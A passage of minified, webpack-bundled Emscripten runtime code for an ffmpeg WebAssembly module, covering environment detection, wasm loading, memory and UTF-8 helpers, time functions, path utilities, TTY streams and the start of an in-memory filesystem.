                            ? ((scriptDirectory = ENVIRONMENT_IS_WORKER ? __webpack_require__(81).dirname(scriptDirectory) + "/" : __dirname + "/"),
                              (read_ = function (filename, binary) {
                                  return (
                                      nodeFS ||
                                          (nodeFS = __webpack_require__(
                                              !(function () {
                                                  var e = new Error("Cannot find module 'fs'");
                                                  throw ((e.code = "MODULE_NOT_FOUND"), e);
                                              })()
                                          )),
                                      nodePath || (nodePath = __webpack_require__(81)),
                                      (filename = nodePath.normalize(filename)),
                                      nodeFS.readFileSync(filename, binary ? null : "utf8")
                                  );
                              }),
                              (readBinary = function (filename) {
                                  var ret = read_(filename, !0);
                                  return ret.buffer || (ret = new Uint8Array(ret)), assert(ret.buffer), ret;
                              }),
                              process.argv.length > 1 && (thisProgram = process.argv[1].replace(/\\/g, "/")),
                              (arguments_ = process.argv.slice(2)),
                              process.on("uncaughtException", function (ex) {
                                  if (!(ex instanceof ExitStatus)) throw ex;
                              }),
                              process.on("unhandledRejection", abort),
                              (quit_ = function (status) {
                                  process.exit(status);
                              }),
                              (Module.inspect = function () {
                                  return "[Emscripten Module object]";
                              }))
                            : ENVIRONMENT_IS_SHELL
                            ? ("undefined" != typeof read &&
                                  (read_ = function (f) {
                                      return read(f);
                                  }),
                              (readBinary = function (f) {
                                  var data;
                                  return "function" == typeof readbuffer ? new Uint8Array(readbuffer(f)) : (assert("object" == typeof (data = read(f, "binary"))), data);
                              }),
                              "undefined" != typeof scriptArgs ? (arguments_ = scriptArgs) : void 0 !== arguments && (arguments_ = arguments),
                              "function" == typeof quit &&
                                  (quit_ = function (status) {
                                      quit(status);
                                  }),
                              "undefined" != typeof print && ("undefined" == typeof console && (console = {}), (console.log = print), (console.warn = console.error = "undefined" != typeof printErr ? printErr : print)))
                            : (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) &&
                              (ENVIRONMENT_IS_WORKER ? (scriptDirectory = self.location.href) : "undefined" != typeof document && document.currentScript && (scriptDirectory = document.currentScript.src),
                              _scriptDir && (scriptDirectory = _scriptDir),
                              (scriptDirectory = 0 !== scriptDirectory.indexOf("blob:") ? scriptDirectory.substr(0, scriptDirectory.lastIndexOf("/") + 1) : ""),
                              (read_ = function (url) {
                                  var xhr = new XMLHttpRequest();
                                  return xhr.open("GET", url, !1), xhr.send(null), xhr.responseText;
                              }),
                              ENVIRONMENT_IS_WORKER &&
                                  (readBinary = function (url) {
                                      var xhr = new XMLHttpRequest();
                                      return xhr.open("GET", url, !1), (xhr.responseType = "arraybuffer"), xhr.send(null), new Uint8Array(xhr.response);
                                  }),
                              (readAsync = function (url, onload, onerror) {
                                  var xhr = new XMLHttpRequest();
                                  xhr.open("GET", url, !0),
                                      (xhr.responseType = "arraybuffer"),
                                      (xhr.onload = function () {
                                          200 == xhr.status || (0 == xhr.status && xhr.response) ? onload(xhr.response) : onerror();
                                      }),
                                      (xhr.onerror = onerror),
                                      xhr.send(null);
                              }));
                        var out = Module.print || console.log.bind(console),
                            err = Module.printErr || console.warn.bind(console);
                        for (key in moduleOverrides) moduleOverrides.hasOwnProperty(key) && (Module[key] = moduleOverrides[key]);
                        (moduleOverrides = null), Module.arguments && (arguments_ = Module.arguments), Module.thisProgram && (thisProgram = Module.thisProgram), Module.quit && (quit_ = Module.quit);
                        var STACK_ALIGN = 16;
                        function alignMemory(size, factor) {
                            return factor || (factor = STACK_ALIGN), Math.ceil(size / factor) * factor;
                        }
                        var wasmBinary,
                            tempRet0 = 0,
                            setTempRet0 = function (value) {
                                tempRet0 = value;
                            },
                            getTempRet0 = function () {
                                return tempRet0;
                            };
                        Module.wasmBinary && (wasmBinary = Module.wasmBinary);
                        var noExitRuntime = Module.noExitRuntime || !1;
                        function setValue(ptr, value, type, noSafe) {
                            switch (("*" === (type = type || "i8").charAt(type.length - 1) && (type = "i32"), type)) {
                                case "i1":
                                case "i8":
                                    HEAP8[ptr >> 0] = value;
                                    break;
                                case "i16":
                                    HEAP16[ptr >> 1] = value;
                                    break;
                                case "i32":
                                    HEAP32[ptr >> 2] = value;
                                    break;
                                case "i64":
                                    (tempI64 = [
                                        value >>> 0,
                                        ((tempDouble = value),
                                        +Math.abs(tempDouble) >= 1 ? (tempDouble > 0 ? (0 | Math.min(+Math.floor(tempDouble / 4294967296), 4294967295)) >>> 0 : ~~+Math.ceil((tempDouble - +(~~tempDouble >>> 0)) / 4294967296) >>> 0) : 0),
                                    ]),
                                        (HEAP32[ptr >> 2] = tempI64[0]),
                                        (HEAP32[(ptr + 4) >> 2] = tempI64[1]);
                                    break;
                                case "float":
                                    HEAPF32[ptr >> 2] = value;
                                    break;
                                case "double":
                                    HEAPF64[ptr >> 3] = value;
                                    break;
                                default:
                                    abort("invalid type for setValue: " + type);
                            }
                        }
                        "object" != typeof WebAssembly && abort("no native wasm support detected");
                        var ABORT = !1;
                        function assert(condition, text) {
                            condition || abort("Assertion failed: " + text);
                        }
                        function getCFunc(ident) {
                            var func = Module["_" + ident];
                            return assert(func, "Cannot call unknown function " + ident + ", make sure it is exported"), func;
                        }
                        function ccall(ident, returnType, argTypes, args, opts) {
                            var toC = {
                                    string: function (str) {
                                        var ret = 0;
                                        if (null != str && 0 !== str) {
                                            var len = 1 + (str.length << 2);
                                            stringToUTF8(str, (ret = stackAlloc(len)), len);
                                        }
                                        return ret;
                                    },
                                    array: function (arr) {
                                        var ret = stackAlloc(arr.length);
                                        return writeArrayToMemory(arr, ret), ret;
                                    },
                                },
                                func = getCFunc(ident),
                                cArgs = [],
                                stack = 0;
                            if (args)
                                for (var i = 0; i < args.length; i++) {
                                    var converter = toC[argTypes[i]];
                                    converter ? (0 === stack && (stack = stackSave()), (cArgs[i] = converter(args[i]))) : (cArgs[i] = args[i]);
                                }
                            var ret = func.apply(null, cArgs);
                            return (
                                (ret = (function (ret) {
                                    return "string" === returnType ? UTF8ToString(ret) : "boolean" === returnType ? Boolean(ret) : ret;
                                })(ret)),
                                0 !== stack && stackRestore(stack),
                                ret
                            );
                        }
                        function cwrap(ident, returnType, argTypes, opts) {
                            var numericArgs = (argTypes = argTypes || []).every(function (type) {
                                return "number" === type;
                            });
                            return "string" !== returnType && numericArgs && !opts
                                ? getCFunc(ident)
                                : function () {
                                      return ccall(ident, returnType, argTypes, arguments);
                                  };
                        }
                        var buffer,
                            HEAP8,
                            HEAPU8,
                            HEAP16,
                            HEAPU16,
                            HEAP32,
                            HEAPF32,
                            HEAPF64,
                            UTF8Decoder = "undefined" != typeof TextDecoder ? new TextDecoder("utf8") : void 0;
                        function UTF8ArrayToString(heap, idx, maxBytesToRead) {
                            for (var endIdx = idx + maxBytesToRead, endPtr = idx; heap[endPtr] && !(endPtr >= endIdx); ) ++endPtr;
                            if (endPtr - idx > 16 && heap.subarray && UTF8Decoder) return UTF8Decoder.decode(heap.subarray(idx, endPtr));
                            for (var str = ""; idx < endPtr; ) {
                                var u0 = heap[idx++];
                                if (128 & u0) {
                                    var u1 = 63 & heap[idx++];
                                    if (192 != (224 & u0)) {
                                        var u2 = 63 & heap[idx++];
                                        if ((u0 = 224 == (240 & u0) ? ((15 & u0) << 12) | (u1 << 6) | u2 : ((7 & u0) << 18) | (u1 << 12) | (u2 << 6) | (63 & heap[idx++])) < 65536) str += String.fromCharCode(u0);
                                        else {
                                            var ch = u0 - 65536;
                                            str += String.fromCharCode(55296 | (ch >> 10), 56320 | (1023 & ch));
                                        }
                                    } else str += String.fromCharCode(((31 & u0) << 6) | u1);
                                } else str += String.fromCharCode(u0);
                            }
                            return str;
                        }
                        function UTF8ToString(ptr, maxBytesToRead) {
                            return ptr ? UTF8ArrayToString(HEAPU8, ptr, maxBytesToRead) : "";
                        }
                        function stringToUTF8Array(str, heap, outIdx, maxBytesToWrite) {
                            if (!(maxBytesToWrite > 0)) return 0;
                            for (var startIdx = outIdx, endIdx = outIdx + maxBytesToWrite - 1, i = 0; i < str.length; ++i) {
                                var u = str.charCodeAt(i);
                                if ((u >= 55296 && u <= 57343 && (u = (65536 + ((1023 & u) << 10)) | (1023 & str.charCodeAt(++i))), u <= 127)) {
                                    if (outIdx >= endIdx) break;
                                    heap[outIdx++] = u;
                                } else if (u <= 2047) {
                                    if (outIdx + 1 >= endIdx) break;
                                    (heap[outIdx++] = 192 | (u >> 6)), (heap[outIdx++] = 128 | (63 & u));
                                } else if (u <= 65535) {
                                    if (outIdx + 2 >= endIdx) break;
                                    (heap[outIdx++] = 224 | (u >> 12)), (heap[outIdx++] = 128 | ((u >> 6) & 63)), (heap[outIdx++] = 128 | (63 & u));
                                } else {
                                    if (outIdx + 3 >= endIdx) break;
                                    (heap[outIdx++] = 240 | (u >> 18)), (heap[outIdx++] = 128 | ((u >> 12) & 63)), (heap[outIdx++] = 128 | ((u >> 6) & 63)), (heap[outIdx++] = 128 | (63 & u));
                                }
                            }
                            return (heap[outIdx] = 0), outIdx - startIdx;
                        }
                        function stringToUTF8(str, outPtr, maxBytesToWrite) {
                            return stringToUTF8Array(str, HEAPU8, outPtr, maxBytesToWrite);
                        }
                        function lengthBytesUTF8(str) {
                            for (var len = 0, i = 0; i < str.length; ++i) {
                                var u = str.charCodeAt(i);
                                u >= 55296 && u <= 57343 && (u = (65536 + ((1023 & u) << 10)) | (1023 & str.charCodeAt(++i))), u <= 127 ? ++len : (len += u <= 2047 ? 2 : u <= 65535 ? 3 : 4);
                            }
                            return len;
                        }
                        function allocateUTF8(str) {
                            var size = lengthBytesUTF8(str) + 1,
                                ret = _malloc(size);
                            return ret && stringToUTF8Array(str, HEAP8, ret, size), ret;
                        }
                        function allocateUTF8OnStack(str) {
                            var size = lengthBytesUTF8(str) + 1,
                                ret = stackAlloc(size);
                            return stringToUTF8Array(str, HEAP8, ret, size), ret;
                        }
                        function writeArrayToMemory(array, buffer) {
                            HEAP8.set(array, buffer);
                        }
                        function writeAsciiToMemory(str, buffer, dontAddNull) {
                            for (var i = 0; i < str.length; ++i) HEAP8[buffer++ >> 0] = str.charCodeAt(i);
                            dontAddNull || (HEAP8[buffer >> 0] = 0);
                        }
                        function updateGlobalBufferAndViews(buf) {
                            (buffer = buf),
                                (Module.HEAP8 = HEAP8 = new Int8Array(buf)),
                                (Module.HEAP16 = HEAP16 = new Int16Array(buf)),
                                (Module.HEAP32 = HEAP32 = new Int32Array(buf)),
                                (Module.HEAPU8 = HEAPU8 = new Uint8Array(buf)),
                                (Module.HEAPU16 = HEAPU16 = new Uint16Array(buf)),
                                (Module.HEAPU32 = new Uint32Array(buf)),
                                (Module.HEAPF32 = HEAPF32 = new Float32Array(buf)),
                                (Module.HEAPF64 = HEAPF64 = new Float64Array(buf));
                        }
                        Module.INITIAL_MEMORY;
                        var wasmTable,
                            __ATPRERUN__ = [],
                            __ATINIT__ = [],
                            __ATMAIN__ = [],
                            __ATEXIT__ = [],
                            __ATPOSTRUN__ = [];
                        function preRun() {
                            if (Module.preRun) for ("function" == typeof Module.preRun && (Module.preRun = [Module.preRun]); Module.preRun.length; ) addOnPreRun(Module.preRun.shift());
                            callRuntimeCallbacks(__ATPRERUN__);
                        }
                        function initRuntime() {
                            Module.noFSInit || FS.init.initialized || FS.init(), (FS.ignorePermissions = !1), TTY.init(), (SOCKFS.root = FS.mount(SOCKFS, {}, null)), callRuntimeCallbacks(__ATINIT__);
                        }
                        function preMain() {
                            callRuntimeCallbacks(__ATMAIN__);
                        }
                        function exitRuntime() {
                            callRuntimeCallbacks(__ATEXIT__), FS.quit(), TTY.shutdown();
                        }
                        function postRun() {
                            if (Module.postRun) for ("function" == typeof Module.postRun && (Module.postRun = [Module.postRun]); Module.postRun.length; ) addOnPostRun(Module.postRun.shift());
                            callRuntimeCallbacks(__ATPOSTRUN__);
                        }
                        function addOnPreRun(cb) {
                            __ATPRERUN__.unshift(cb);
                        }
                        function addOnInit(cb) {
                            __ATINIT__.unshift(cb);
                        }
                        function addOnPostRun(cb) {
                            __ATPOSTRUN__.unshift(cb);
                        }
                        var runDependencies = 0,
                            runDependencyWatcher = null,
                            dependenciesFulfilled = null;
                        function addRunDependency(id) {
                            runDependencies++, Module.monitorRunDependencies && Module.monitorRunDependencies(runDependencies);
                        }
                        function removeRunDependency(id) {
                            if (
                                (runDependencies--,
                                Module.monitorRunDependencies && Module.monitorRunDependencies(runDependencies),
                                0 == runDependencies && (null !== runDependencyWatcher && (clearInterval(runDependencyWatcher), (runDependencyWatcher = null)), dependenciesFulfilled))
                            ) {
                                var callback = dependenciesFulfilled;
                                (dependenciesFulfilled = null), callback();
                            }
                        }
                        function abort(what) {
                            Module.onAbort && Module.onAbort(what), err((what += "")), (ABORT = !0), (what = "abort(" + what + "). Build with -s ASSERTIONS=1 for more info.");
                            var e = new WebAssembly.RuntimeError(what);
                            throw (readyPromiseReject(e), e);
                        }
                        (Module.preloadedImages = {}), (Module.preloadedAudios = {});
                        var wasmBinaryFile,
                            tempDouble,
                            tempI64,
                            dataURIPrefix = "data:application/octet-stream;base64,";
                        function isDataURI(filename) {
                            return filename.startsWith(dataURIPrefix);
                        }
                        function isFileURI(filename) {
                            return filename.startsWith("file://");
                        }
                        function getBinary(file) {
                            try {
                                if (file == wasmBinaryFile && wasmBinary) return new Uint8Array(wasmBinary);
                                if (readBinary) return readBinary(file);
                                throw "both async and sync fetching of the wasm failed";
                            } catch (err) {
                                abort(err);
                            }
                        }
                        function getBinaryPromise() {
                            if (!wasmBinary && (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER)) {
                                if ("function" == typeof fetch && !isFileURI(wasmBinaryFile))
                                    return fetch(wasmBinaryFile, { credentials: "same-origin" })
                                        .then(function (response) {
                                            if (!response.ok) throw "failed to load wasm binary file at '" + wasmBinaryFile + "'";
                                            return response.arrayBuffer();
                                        })
                                        .catch(function () {
                                            return getBinary(wasmBinaryFile);
                                        });
                                if (readAsync)
                                    return new Promise(function (resolve, reject) {
                                        readAsync(
                                            wasmBinaryFile,
                                            function (response) {
                                                resolve(new Uint8Array(response));
                                            },
                                            reject
                                        );
                                    });
                            }
                            return Promise.resolve().then(function () {
                                return getBinary(wasmBinaryFile);
                            });
                        }
                        function createWasm() {
                            var info = { a: asmLibraryArg };
                            function receiveInstance(instance, module) {
                                var exports = instance.exports;
                                (Module.asm = exports), updateGlobalBufferAndViews(Module.asm.Ea.buffer), (wasmTable = Module.asm.Ja), addOnInit(Module.asm.Fa), removeRunDependency();
                            }
                            function receiveInstantiationResult(result) {
                                receiveInstance(result.instance);
                            }
                            function instantiateArrayBuffer(receiver) {
                                return getBinaryPromise()
                                    .then(function (binary) {
                                        return WebAssembly.instantiate(binary, info);
                                    })
                                    .then(receiver, function (reason) {
                                        err("failed to asynchronously prepare wasm: " + reason), abort(reason);
                                    });
                            }
                            if ((addRunDependency(), Module.instantiateWasm))
                                try {
                                    return Module.instantiateWasm(info, receiveInstance);
                                } catch (e) {
                                    return err("Module.instantiateWasm callback failed with error: " + e), !1;
                                }
                            return (
                                (wasmBinary || "function" != typeof WebAssembly.instantiateStreaming || isDataURI(wasmBinaryFile) || isFileURI(wasmBinaryFile) || "function" != typeof fetch
                                    ? instantiateArrayBuffer(receiveInstantiationResult)
                                    : fetch(wasmBinaryFile, { credentials: "same-origin" }).then(function (response) {
                                          return WebAssembly.instantiateStreaming(response, info).then(receiveInstantiationResult, function (reason) {
                                              return err("wasm streaming compile failed: " + reason), err("falling back to ArrayBuffer instantiation"), instantiateArrayBuffer(receiveInstantiationResult);
                                          });
                                      })
                                ).catch(readyPromiseReject),
                                {}
                            );
                        }
                        function callRuntimeCallbacks(callbacks) {
                            for (; callbacks.length > 0; ) {
                                var callback = callbacks.shift();
                                if ("function" != typeof callback) {
                                    var func = callback.func;
                                    "number" == typeof func ? (void 0 === callback.arg ? wasmTable.get(func)() : wasmTable.get(func)(callback.arg)) : func(void 0 === callback.arg ? null : callback.arg);
                                } else callback(Module);
                            }
                        }
                        isDataURI((wasmBinaryFile = "ffmpeg-core.wasm")) || (wasmBinaryFile = locateFile(wasmBinaryFile));
                        var _emscripten_get_now,
                            runtimeKeepaliveCounter = 0;
                        function keepRuntimeAlive() {
                            return noExitRuntime || runtimeKeepaliveCounter > 0;
                        }
                        function ___assert_fail(condition, filename, line, func) {
                            abort("Assertion failed: " + UTF8ToString(condition) + ", at: " + [filename ? UTF8ToString(filename) : "unknown filename", line, func ? UTF8ToString(func) : "unknown function"]);
                        }
                        _emscripten_get_now = ENVIRONMENT_IS_NODE
                            ? function () {
                                  var t = process.hrtime();
                                  return 1e3 * t[0] + t[1] / 1e6;
                              }
                            : "undefined" != typeof dateNow
                            ? dateNow
                            : function () {
                                  return performance.now();
                              };
                        var _emscripten_get_now_is_monotonic = !0;
                        function setErrNo(value) {
                            return (HEAP32[___errno_location() >> 2] = value), value;
                        }
                        function _clock_gettime(clk_id, tp) {
                            var now;
                            if (0 === clk_id) now = Date.now();
                            else {
                                if ((1 !== clk_id && 4 !== clk_id) || !_emscripten_get_now_is_monotonic) return setErrNo(28), -1;
                                now = _emscripten_get_now();
                            }
                            return (HEAP32[tp >> 2] = (now / 1e3) | 0), (HEAP32[(tp + 4) >> 2] = ((now % 1e3) * 1e3 * 1e3) | 0), 0;
                        }
                        function ___clock_gettime(a0, a1) {
                            return _clock_gettime(a0, a1);
                        }
                        function _atexit(func, arg) {
                            __ATEXIT__.unshift({ func: func, arg: arg });
                        }
                        function ___cxa_atexit(a0, a1) {
                            return _atexit(a0, a1);
                        }
                        function _gmtime_r(time, tmPtr) {
                            var date = new Date(1e3 * HEAP32[time >> 2]);
                            (HEAP32[tmPtr >> 2] = date.getUTCSeconds()),
                                (HEAP32[(tmPtr + 4) >> 2] = date.getUTCMinutes()),
                                (HEAP32[(tmPtr + 8) >> 2] = date.getUTCHours()),
                                (HEAP32[(tmPtr + 12) >> 2] = date.getUTCDate()),
                                (HEAP32[(tmPtr + 16) >> 2] = date.getUTCMonth()),
                                (HEAP32[(tmPtr + 20) >> 2] = date.getUTCFullYear() - 1900),
                                (HEAP32[(tmPtr + 24) >> 2] = date.getUTCDay()),
                                (HEAP32[(tmPtr + 36) >> 2] = 0),
                                (HEAP32[(tmPtr + 32) >> 2] = 0);
                            var start = Date.UTC(date.getUTCFullYear(), 0, 1, 0, 0, 0, 0),
                                yday = ((date.getTime() - start) / 864e5) | 0;
                            return (HEAP32[(tmPtr + 28) >> 2] = yday), _gmtime_r.GMTString || (_gmtime_r.GMTString = allocateUTF8("GMT")), (HEAP32[(tmPtr + 40) >> 2] = _gmtime_r.GMTString), tmPtr;
                        }
                        function ___gmtime_r(a0, a1) {
                            return _gmtime_r(a0, a1);
                        }
                        function _tzset() {
                            if (!_tzset.called) {
                                _tzset.called = !0;
                                var currentYear = new Date().getFullYear(),
                                    winter = new Date(currentYear, 0, 1),
                                    summer = new Date(currentYear, 6, 1),
                                    winterOffset = winter.getTimezoneOffset(),
                                    summerOffset = summer.getTimezoneOffset(),
                                    stdTimezoneOffset = Math.max(winterOffset, summerOffset);
                                (HEAP32[__get_timezone() >> 2] = 60 * stdTimezoneOffset), (HEAP32[__get_daylight() >> 2] = Number(winterOffset != summerOffset));
                                var winterName = extractZone(winter),
                                    summerName = extractZone(summer),
                                    winterNamePtr = allocateUTF8(winterName),
                                    summerNamePtr = allocateUTF8(summerName);
                                summerOffset < winterOffset
                                    ? ((HEAP32[__get_tzname() >> 2] = winterNamePtr), (HEAP32[(__get_tzname() + 4) >> 2] = summerNamePtr))
                                    : ((HEAP32[__get_tzname() >> 2] = summerNamePtr), (HEAP32[(__get_tzname() + 4) >> 2] = winterNamePtr));
                            }
                            function extractZone(date) {
                                var match = date.toTimeString().match(/\(([A-Za-z ]+)\)$/);
                                return match ? match[1] : "GMT";
                            }
                        }
                        function _localtime_r(time, tmPtr) {
                            _tzset();
                            var date = new Date(1e3 * HEAP32[time >> 2]);
                            (HEAP32[tmPtr >> 2] = date.getSeconds()),
                                (HEAP32[(tmPtr + 4) >> 2] = date.getMinutes()),
                                (HEAP32[(tmPtr + 8) >> 2] = date.getHours()),
                                (HEAP32[(tmPtr + 12) >> 2] = date.getDate()),
                                (HEAP32[(tmPtr + 16) >> 2] = date.getMonth()),
                                (HEAP32[(tmPtr + 20) >> 2] = date.getFullYear() - 1900),
                                (HEAP32[(tmPtr + 24) >> 2] = date.getDay());
                            var start = new Date(date.getFullYear(), 0, 1),
                                yday = ((date.getTime() - start.getTime()) / 864e5) | 0;
                            (HEAP32[(tmPtr + 28) >> 2] = yday), (HEAP32[(tmPtr + 36) >> 2] = -60 * date.getTimezoneOffset());
                            var summerOffset = new Date(date.getFullYear(), 6, 1).getTimezoneOffset(),
                                winterOffset = start.getTimezoneOffset(),
                                dst = 0 | (summerOffset != winterOffset && date.getTimezoneOffset() == Math.min(winterOffset, summerOffset));
                            HEAP32[(tmPtr + 32) >> 2] = dst;
                            var zonePtr = HEAP32[(__get_tzname() + (dst ? 4 : 0)) >> 2];
                            return (HEAP32[(tmPtr + 40) >> 2] = zonePtr), tmPtr;
                        }
                        function ___localtime_r(a0, a1) {
                            return _localtime_r(a0, a1);
                        }
                        var PATH = {
                            splitPath: function (filename) {
                                return /^(\/?|)([\s\S]*?)((?:\.{1,2}|[^\/]+?|)(\.[^.\/]*|))(?:[\/]*)$/.exec(filename).slice(1);
                            },
                            normalizeArray: function (parts, allowAboveRoot) {
                                for (var up = 0, i = parts.length - 1; i >= 0; i--) {
                                    var last = parts[i];
                                    "." === last ? parts.splice(i, 1) : ".." === last ? (parts.splice(i, 1), up++) : up && (parts.splice(i, 1), up--);
                                }
                                if (allowAboveRoot) for (; up; up--) parts.unshift("..");
                                return parts;
                            },
                            normalize: function (path) {
                                var isAbsolute = "/" === path.charAt(0),
                                    trailingSlash = "/" === path.substr(-1);
                                return (
                                    (path = PATH.normalizeArray(
                                        path.split("/").filter(function (p) {
                                            return !!p;
                                        }),
                                        !isAbsolute
                                    ).join("/")) ||
                                        isAbsolute ||
                                        (path = "."),
                                    path && trailingSlash && (path += "/"),
                                    (isAbsolute ? "/" : "") + path
                                );
                            },
                            dirname: function (path) {
                                var result = PATH.splitPath(path),
                                    root = result[0],
                                    dir = result[1];
                                return root || dir ? (dir && (dir = dir.substr(0, dir.length - 1)), root + dir) : ".";
                            },
                            basename: function (path) {
                                if ("/" === path) return "/";
                                var lastSlash = (path = (path = PATH.normalize(path)).replace(/\/$/, "")).lastIndexOf("/");
                                return -1 === lastSlash ? path : path.substr(lastSlash + 1);
                            },
                            extname: function (path) {
                                return PATH.splitPath(path)[3];
                            },
                            join: function () {
                                var paths = Array.prototype.slice.call(arguments, 0);
                                return PATH.normalize(paths.join("/"));
                            },
                            join2: function (l, r) {
                                return PATH.normalize(l + "/" + r);
                            },
                        };
                        function getRandomDevice() {
                            if ("object" == typeof crypto && "function" == typeof crypto.getRandomValues) {
                                var randomBuffer = new Uint8Array(1);
                                return function () {
                                    return crypto.getRandomValues(randomBuffer), randomBuffer[0];
                                };
                            }
                            if (ENVIRONMENT_IS_NODE)
                                try {
                                    var crypto_module = __webpack_require__(189);
                                    return function () {
                                        return crypto_module.randomBytes(1)[0];
                                    };
                                } catch (e) {}
                            return function () {
                                abort("randomDevice");
                            };
                        }
                        var PATH_FS = {
                                resolve: function () {
                                    for (var resolvedPath = "", resolvedAbsolute = !1, i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
                                        var path = i >= 0 ? arguments[i] : FS.cwd();
                                        if ("string" != typeof path) throw new TypeError("Arguments to path.resolve must be strings");
                                        if (!path) return "";
                                        (resolvedPath = path + "/" + resolvedPath), (resolvedAbsolute = "/" === path.charAt(0));
                                    }
                                    return (
                                        (resolvedAbsolute ? "/" : "") +
                                            (resolvedPath = PATH.normalizeArray(
                                                resolvedPath.split("/").filter(function (p) {
                                                    return !!p;
                                                }),
                                                !resolvedAbsolute
                                            ).join("/")) || "."
                                    );
                                },
                                relative: function (from, to) {
                                    function trim(arr) {
                                        for (var start = 0; start < arr.length && "" === arr[start]; start++);
                                        for (var end = arr.length - 1; end >= 0 && "" === arr[end]; end--);
                                        return start > end ? [] : arr.slice(start, end - start + 1);
                                    }
                                    (from = PATH_FS.resolve(from).substr(1)), (to = PATH_FS.resolve(to).substr(1));
                                    for (var fromParts = trim(from.split("/")), toParts = trim(to.split("/")), length = Math.min(fromParts.length, toParts.length), samePartsLength = length, i = 0; i < length; i++)
                                        if (fromParts[i] !== toParts[i]) {
                                            samePartsLength = i;
                                            break;
                                        }
                                    var outputParts = [];
                                    for (i = samePartsLength; i < fromParts.length; i++) outputParts.push("..");
                                    return (outputParts = outputParts.concat(toParts.slice(samePartsLength))).join("/");
                                },
                            },
                            TTY = {
                                ttys: [],
                                init: function () {},
                                shutdown: function () {},
                                register: function (dev, ops) {
                                    (TTY.ttys[dev] = { input: [], output: [], ops: ops }), FS.registerDevice(dev, TTY.stream_ops);
                                },
                                stream_ops: {
                                    open: function (stream) {
                                        var tty = TTY.ttys[stream.node.rdev];
                                        if (!tty) throw new FS.ErrnoError(43);
                                        (stream.tty = tty), (stream.seekable = !1);
                                    },
                                    close: function (stream) {
                                        stream.tty.ops.flush(stream.tty);
                                    },
                                    flush: function (stream) {
                                        stream.tty.ops.flush(stream.tty);
                                    },
                                    read: function (stream, buffer, offset, length, pos) {
                                        if (!stream.tty || !stream.tty.ops.get_char) throw new FS.ErrnoError(60);
                                        for (var bytesRead = 0, i = 0; i < length; i++) {
                                            var result;
                                            try {
                                                result = stream.tty.ops.get_char(stream.tty);
                                            } catch (e) {
                                                throw new FS.ErrnoError(29);
                                            }
                                            if (void 0 === result && 0 === bytesRead) throw new FS.ErrnoError(6);
                                            if (null == result) break;
                                            bytesRead++, (buffer[offset + i] = result);
                                        }
                                        return bytesRead && (stream.node.timestamp = Date.now()), bytesRead;
                                    },
                                    write: function (stream, buffer, offset, length, pos) {
                                        if (!stream.tty || !stream.tty.ops.put_char) throw new FS.ErrnoError(60);
                                        try {
                                            for (var i = 0; i < length; i++) stream.tty.ops.put_char(stream.tty, buffer[offset + i]);
                                        } catch (e) {
                                            throw new FS.ErrnoError(29);
                                        }
                                        return length && (stream.node.timestamp = Date.now()), i;
                                    },
                                },
                                default_tty_ops: {
                                    get_char: function (tty) {
                                        if (!tty.input.length) {
                                            var result = null;
                                            if (ENVIRONMENT_IS_NODE) {
                                                var buf = Buffer.alloc ? Buffer.alloc(256) : new Buffer(256),
                                                    bytesRead = 0;
                                                try {
                                                    bytesRead = nodeFS.readSync(process.stdin.fd, buf, 0, 256, null);
                                                } catch (e) {
                                                    if (!e.toString().includes("EOF")) throw e;
                                                    bytesRead = 0;
                                                }
                                                result = bytesRead > 0 ? buf.slice(0, bytesRead).toString("utf-8") : null;
                                            } else
                                                "undefined" != typeof window && "function" == typeof window.prompt
                                                    ? null !== (result = window.prompt("Input: ")) && (result += "\n")
                                                    : "function" == typeof readline && null !== (result = readline()) && (result += "\n");
                                            if (!result) return null;
                                            tty.input = intArrayFromString(result, !0);
                                        }
                                        return tty.input.shift();
                                    },
                                    put_char: function (tty, val) {
                                        null === val || 10 === val ? (out(UTF8ArrayToString(tty.output, 0)), (tty.output = [])) : 0 != val && tty.output.push(val);
                                    },
                                    flush: function (tty) {
                                        tty.output && tty.output.length > 0 && (out(UTF8ArrayToString(tty.output, 0)), (tty.output = []));
                                    },
                                },
                                default_tty1_ops: {
                                    put_char: function (tty, val) {
                                        null === val || 10 === val ? (err(UTF8ArrayToString(tty.output, 0)), (tty.output = [])) : 0 != val && tty.output.push(val);
                                    },
                                    flush: function (tty) {
                                        tty.output && tty.output.length > 0 && (err(UTF8ArrayToString(tty.output, 0)), (tty.output = []));
                                    },
                                },
                            };
                        function mmapAlloc(size) {
                            for (var alignedSize = alignMemory(size, 65536), ptr = _malloc(alignedSize); size < alignedSize; ) HEAP8[ptr + size++] = 0;
                            return ptr;
                        }
                        var MEMFS = {
                                ops_table: null,
                                mount: function (mount) {
                                    return MEMFS.createNode(null, "/", 16895, 0);
                                },
                                createNode: function (parent, name, mode, dev) {
                                    if (FS.isBlkdev(mode) || FS.isFIFO(mode)) throw new FS.ErrnoError(63);
                                    MEMFS.ops_table ||
                                        (MEMFS.ops_table = {
                                            dir: {
                                                node: {
                                                    getattr: MEMFS.node_ops.getattr,
                                                    setattr: MEMFS.node_ops.setattr,
                                                    lookup: MEMFS.node_ops.lookup,
                                                    mknod: MEMFS.node_ops.mknod,
                                                    rename: MEMFS.node_ops.rename,
                                                    unlink: MEMFS.node_ops.unlink,
                                                    rmdir: MEMFS.node_ops.rmdir,
                                                    readdir: MEMFS.node_ops.readdir,
                                                    symlink: MEMFS.node_ops.symlink,
                                                },
                                                stream: { llseek: MEMFS.stream_ops.llseek },
                                            },
                                            file: {
                                                node: { getattr: MEMFS.node_ops.getattr, setattr: MEMFS.node_ops.setattr },
                                                stream: {
                                                    llseek: MEMFS.stream_ops.llseek,
                                                    read: MEMFS.stream_ops.read,
                                                    write: MEMFS.stream_ops.write,
                                                    allocate: MEMFS.stream_ops.allocate,
                                                    mmap: MEMFS.stream_ops.mmap,
                                                    msync: MEMFS.stream_ops.msync,
                                                },
                                            },
                                            link: { node: { getattr: MEMFS.node_ops.getattr, setattr: MEMFS.node_ops.setattr, readlink: MEMFS.node_ops.readlink }, stream: {} },
                                            chrdev: { node: { getattr: MEMFS.node_ops.getattr, setattr: MEMFS.node_ops.setattr }, stream: FS.chrdev_stream_ops },
                                        });
                                    var node = FS.createNode(parent, name, mode, dev);
                                    return (
                                        FS.isDir(node.mode)
                                            ? ((node.node_ops = MEMFS.ops_table.dir.node), (node.stream_ops = MEMFS.ops_table.dir.stream), (node.contents = {}))
                                            : FS.isFile(node.mode)
